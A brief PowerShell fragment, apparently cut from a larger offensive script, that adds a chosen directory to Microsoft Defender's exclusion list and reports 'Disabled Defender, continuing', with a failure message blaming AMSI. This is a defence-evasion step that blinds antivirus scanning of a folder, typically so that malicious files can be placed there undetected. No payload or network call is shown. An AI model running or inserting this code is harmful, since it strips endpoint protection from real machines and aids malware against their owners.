{
    Add-MpPreference -Force -ExclusionPath $directory
    If ($?){
    Write-Host "Disabled Defender, continuing" -ForegroundColor Green}
    else{
    Write-Host "Failed to disable Defender. Damn you AMSI." -ForegroundColor Red
    }
}
